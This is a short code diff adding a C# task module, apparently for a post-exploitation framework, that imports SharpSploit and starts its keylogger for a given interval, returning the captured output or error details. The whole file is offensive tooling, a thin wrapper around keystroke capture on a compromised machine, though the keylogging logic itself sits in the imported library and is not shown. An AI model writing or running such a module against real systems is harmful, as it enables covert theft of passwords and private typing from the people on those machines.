@@ -1,0 +1,16 @@
+using System;
+
+using SharpSploit.Enumeration;
+
+public static class Task
+{
+	public static string Execute(string Interval = "60")
+    {
+        try
+        {
+            int time = int.Parse(Interval);
+            return Keylogger.StartKeylogger(time);
+        }
+        catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+    }
+}
